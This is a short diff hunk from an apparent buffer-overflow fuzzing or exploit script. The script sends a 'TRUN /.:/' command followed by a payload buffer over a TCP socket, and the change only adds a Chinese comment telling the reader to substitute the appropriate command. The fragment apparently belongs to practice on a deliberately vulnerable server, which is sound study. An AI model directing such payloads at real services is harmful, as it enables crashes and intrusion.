@@ -22,7 +22,7 @@ def main():
             print(f"[-]Sending payload with {len(buffer)} bytes")
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((target_ip, target_port))
-            s.send(("TRUN /.:/" + buffer).encode())
+            s.send(("TRUN /.:/" + buffer).encode())                       # 修改为适当的命令
             s.settimeout(10)
             response = s.recv(1024)
 
